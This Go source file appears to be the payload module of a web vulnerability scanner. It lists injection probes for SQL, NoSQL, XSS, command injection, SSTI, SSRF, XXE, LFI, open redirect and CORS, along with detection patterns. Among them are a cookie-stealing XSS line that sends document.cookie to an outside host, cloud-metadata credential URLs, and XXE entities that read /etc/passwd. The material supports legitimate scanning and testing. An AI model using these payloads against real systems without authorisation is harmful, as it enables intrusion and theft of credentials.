package inject

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
)

func UniqueMarker(prefix string) string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("FNG%s%s", prefix, hex.EncodeToString(b))
}

func SQLIErrorPayloads() []string {
	return []string{
		"'", "\"", "')", "'))", "\\'",
		"' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
		"' OR 1=1#", "' OR 1=1/*", "' AND 1=1",
		"' AND '1'='1", "' AND '1'='2",
		"1' AND '1'='1", "1' AND '1'='2",
		"' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
	}
}

func SQLIErrorPatterns() []string {
	return []string{
		"you have an error in your sql syntax",
		"mysql_fetch", "mysql_num_rows",
		"ORA-01756", "Oracle error", "quoted string not properly terminated",
		"PostgreSQL.*ERROR", "pg_query", "pg_exec",
		"Microsoft.*ODBC.*SQL Server", "Unclosed quotation mark",
		"SQLite.*error", "sqlite3.OperationalError",
		"Warning.*mysql", "valid MySQL result",
		"SQL syntax.*MySQL", "sql syntax",
		"driver.*Error", "SQLSTATE",
		"unclosed quotation mark before", "incorrect syntax near",
		"division by zero", "mysql_numrows",
	}
}

func NoSQLPayloads() []string {
	return []string{
		"' || '1'=='1", "' || '1'=='1' //", "') || '1'=='1",
		"{\"$ne\": null}", "{\"$gt\": \"\"}", "{\"$regex\": \".*\"}",
		"admin' || '1'=='1", "admin') || '1'=='1' //",
	}
}

func NoSQLErrorPatterns() []string {
	return []string{
		"MongoError", "MongoDB", "Unsupported projection",
		"CastError", "Cast to ObjectId failed",
	}
}

type XSSPayload struct {
	Value string
	Check string
	Name  string
}

func XSSPayloads() []XSSPayload {
	return []XSSPayload{
		{`<script>alert(1)</script>`, `<script>alert(1)</script>`, "Basic Script"},
		{`"><script>alert(1)</script>`, `<script>alert(1)</script>`, "Tag Breakout"},
		{`'><script>alert(1)</script>`, `<script>alert(1)</script>`, "Single Quote"},
		{`<img src=x onerror=alert(1)>`, `onerror=alert(1)`, "Img Onerror"},
		{`<svg onload=alert(1)>`, `onload=alert(1)`, "Svg Onload"},
		{`" onmouseover="alert(1)`, `onmouseover="alert(1)`, "Event Handler"},
		{`javascript:alert(1)`, `alert(1)`, "Javascript URI"},
		{`<script>fetch('https://x.com/'+document.cookie)</script>`, `document.cookie`, "Cookie Steal"},
		{`<a href="javascript:alert(1)">x</a>`, `javascript:alert(1)`, "Anchor JS"},
		{`<input onfocus=alert(1) autofocus>`, `onfocus=alert(1)`, "Input Autofocus"},
		{`<details open ontoggle=alert(1)>`, `ontoggle=alert(1)`, "Details Toggle"},
		{`<body onload=alert(1)>`, `onload=alert(1)`, "Body Onload"},
	}
}

type XSSContextualPayload struct {
	Value   string
	Context string
	Check   string
}

func XSSContextualPayloads() []XSSContextualPayload {
	return []XSSContextualPayload{
		{`{{constructor.constructor('alert(1)')()}}`, "js", `constructor.constructor`},
		{`\";alert(1);//`, "js", `alert(1)`},
		{`</script><script>alert(1)</script>`, "html", `alert(1)`},
		{`" autofocus onfocus="alert(1)`, "attr", `onfocus="alert(1)`},
		{`{"a":"<script>alert(1)</script>"}`, "json", `<script>alert(1)</script>`},
	}
}

type XSSBlindPayload struct {
	Value string
	Check string
}

func XSSBlindPayloads() []XSSBlindPayload {
	return []XSSBlindPayload{
		{`<script src="https://blind.fang.xyz/track"></script>`, `blind.fang.xyz`},
		{`<img src="https://blind.fang.xyz/track">`, `blind.fang.xyz`},
	}
}

type CMDIPayload struct {
	Value string
	Check string
}

func CMDIUnixPayloads() []CMDIPayload {
	return []CMDIPayload{
		{`;echo FNGCMDI`, `FNGCMDI`},
		{`|echo FNGCMDI`, `FNGCMDI`},
		{`||echo FNGCMDI`, `FNGCMDI`},
		{`&&echo FNGCMDI`, `FNGCMDI`},
		{"`echo FNGCMDI`", `FNGCMDI`},
		{`$(echo FNGCMDI)`, `FNGCMDI`},
		{`%0aecho FNGCMDI`, `FNGCMDI`},
		{`;echo FNGCMDI;echo FNGCMDI2`, `FNGCMDI`},
		{`|echo FNGCMDI|echo FNGCMDI2`, `FNGCMDI`},
	}
}

func CMDIWindowsPayloads() []CMDIPayload {
	return []CMDIPayload{
		{`&echo FNGCMDI`, `FNGCMDI`},
		{`|echo FNGCMDI`, `FNGCMDI`},
		{`||echo FNGCMDI`, `FNGCMDI`},
		{`&&echo FNGCMDI`, `FNGCMDI`},
	}
}

func CMDITimePayloads() []string {
	return []string{`;sleep 5`, `|sleep 5`, `||sleep 5`, `&&sleep 5`, "`sleep 5`", `$(sleep 5)`}
}

type SSTIPayload struct {
	Value string
	Check string
}

func SSTIJinja2Payloads() []SSTIPayload {
	return []SSTIPayload{
		{`{{7*7}}`, `49`},
		{`{{7*'7'}}`, `7777777`},
		{`{{config}}`, `SECRET_KEY`},
	}
}

func SSTITwigPayloads() []SSTIPayload {
	return []SSTIPayload{
		{`{{7*7}}`, `49`},
		{`{{7*'7'}}`, `49`},
		{`${7*7}`, `49`},
	}
}

func SSTIFreeMarkerPayloads() []SSTIPayload {
	return []SSTIPayload{
		{`${7*7}`, `49`},
		{`${7*'7'}`, `49`},
		{`#{7*7}`, `49`},
	}
}

func SSTIVelocityPayloads() []SSTIPayload {
	return []SSTIPayload{
		{`#set($x=7*7)$x`, `49`},
		{`$x`, `$x`},
	}
}

func SSTIErrorPatterns() []string {
	return []string{
		"TemplateSyntaxError", "TemplateError", "UndefinedError",
		"Undefined variable", "Template compilation error",
		"FreeMarker template error", "freemarker",
		"Twig_Error", "Twig error",
	}
}

func SSRFInternalIPs() []string {
	return []string{
		"http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:443",
		"http://localhost", "http://[::1]", "http://0.0.0.0",
		"http://10.0.0.1", "http://10.0.0.2",
		"http://172.16.0.1", "http://172.17.0.1",
		"http://192.168.0.1", "http://192.168.1.1",
		"http://2130706433", "http://0x7f000001",
		"http://017700000001", "http://127.1",
	}
}

type SSRFCloudMetadata struct {
	URL   string
	Check string
}

func SSRFCloudMetadataEndpoints() []SSRFCloudMetadata {
	return []SSRFCloudMetadata{
		{"http://169.254.169.254/latest/meta-data/", "iam"},
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "role"},
		{"http://169.254.169.254/latest/user-data", "user-data"},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"},
		{"http://metadata.google.internal/computeMetadata/v1/instance/", "project"},
		{"http://100.100.100.200/latest/meta-data/", "meta-data"},
	}
}

func SSRFProtocols() []string {
	return []string{
		"file:///etc/passwd", "file:///c:/windows/win.ini",
		"file:///proc/self/environ",
		"gopher://127.0.0.1:6379/_", "dict://127.0.0.1:6379/",
	}
}

type XXEPayload struct {
	Payload string
	Check   string
	Name    string
}

func XXEClassicPayloads() []XXEPayload {
	return []XXEPayload{
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, "root:", "Classic Unix"},
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`, "[fonts]", "Classic Windows"},
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>`, "localhost", "Hosts File"},
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`, "PATH=", "Proc Environ"},
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>`, "root:", "Parameter Entity"},
	}
}

type XXESOAPPayload struct {
	Payload string
	Check   string
}

func XXESOAPPayloads() []XXESOAPPayload {
	return []XXESOAPPayload{
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>`, "root:"},
	}
}

type XXEJSONPayload struct {
	Payload string
	Check   string
}

func XXEJSONPayloads() []XXEJSONPayload {
	return []XXEJSONPayload{
		{`{"xml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}`, "root:"},
		{`{"xml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"}`, "[fonts]"},
	}
}

type LFIPayload struct {
	Value string
	Check string
	Name  string
}

func LFIPathTraversal() []LFIPayload {
	return []LFIPayload{
		{"../../../etc/passwd", "root:", "3-level Unix"},
		{"../../../../etc/passwd", "root:", "4-level Unix"},
		{"../../../../../etc/passwd", "root:", "5-level Unix"},
		{"..%2F..%2F..%2Fetc%2Fpasswd", "root:", "Double-Encoded"},
		{"..%252F..%252F..%252Fetc%252Fpasswd", "root:", "Double-Encoded Deep"},
		{"../etc/passwd%00", "root:", "Null Byte Unix"},
		{"../../etc/passwd%00", "root:", "Null Byte Deep"},
		{"..\\..\\..\\windows\\win.ini", "[fonts]", "Windows"},
		{"..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows Deep"},
		{"....//....//....//etc/passwd", "root:", "Bypass"},
		{"..;/..;/..;/etc/passwd", "root:", "Java Bypass"},
	}
}

func LFIPHPWrappers() []LFIPayload {
	return []LFIPayload{
		{"php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vdDp4", "B64 Passwd"},
		{"php://filter/convert.base64-encode/resource=/etc/hosts", "bG9jYWxob3N0", "B64 Hosts"},
		{"php://filter/convert.base64-encode/resource=index.php", "PD9waHA", "B64 Index"},
		{"php://filter/read=convert.base64-encode/resource=/etc/passwd", "cm9vdDp4", "Read Filter"},
	}
}

func LFIErrorPatterns() []string {
	return []string{
		"failed to open stream", "No such file", "include(",
		"require(", "file_get_contents", "fread",
	}
}

func OpenRedirectParams() []string {
	return []string{
		"url", "redirect", "next", "return", "rurl", "dest",
		"destination", "redir", "redirect_uri", "redirect_url",
		"continue", "go", "out", "view", "to", "link", "uri",
		"path", "ref", "referer", "return_url", "return_to",
		"return_path", "redirect_to", "target", "u", "q",
	}
}

func RedirectPayloads() []string {
	return []string{
		"https://evil.fangtest.com/phish",
		"//evil.fangtest.com/phish",
		"http://evil.fangtest.com",
		"https://evil.fangtest.com",
		"///evil.fangtest.com",
		"https:evil.fangtest.com",
	}
}

type CORSTestOrigin struct {
	Origin string
	Name   string
}

func CORSOrigins() []CORSTestOrigin {
	return []CORSTestOrigin{
		{"https://evil.fangtest.com", "Arbitrary Origin"},
		{"null", "Null Origin"},
		{"", "Similar Domain"},
		{"", "HTTP Variant"},
		{"", "Subdomain Prefix"},
		{"https://evil.com", "Unrelated Origin"},
		{"file://", "File Protocol"},
	}
}

type SecurityHeader struct {
	Name     string
	Severity int
	Fix      string
	CWE      string
}

var SecurityHeaders = []SecurityHeader{
	{"X-Frame-Options", 4, "Add 'X-Frame-Options: DENY' or 'SAMEORIGIN'", "CWE-1021"},
	{"X-Content-Type-Options", 3, "Add 'X-Content-Type-Options: nosniff'", "CWE-693"},
	{"Strict-Transport-Security", 4, "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains'", "CWE-523"},
	{"Content-Security-Policy", 4, "Implement a Content-Security-Policy header", "CWE-693"},
	{"X-XSS-Protection", 1, "Add 'X-XSS-Protection: 1; mode=block'", "CWE-693"},
	{"Referrer-Policy", 1, "Add 'Referrer-Policy: strict-origin-when-cross-origin'", "CWE-200"},
	{"Permissions-Policy", 1, "Add a Permissions-Policy header", "CWE-693"},
	{"Cache-Control", 2, "Add 'Cache-Control: no-cache, no-store, must-revalidate'", "CWE-525"},
	{"X-Permitted-Cross-Domain-Policies", 2, "Add 'X-Permitted-Cross-Domain-Policies: none'", "CWE-693"},
}

func InlineContains(body, substr string) bool {
	return strings.Contains(strings.ToLower(body), strings.ToLower(substr))
}

func ContainsAny(body string, patterns []string) bool {
	bodyLower := strings.ToLower(body)
	for _, p := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(p)) {
			return true
		}
	}
	return false
}

func Now() time.Time {
	return time.Now()
}
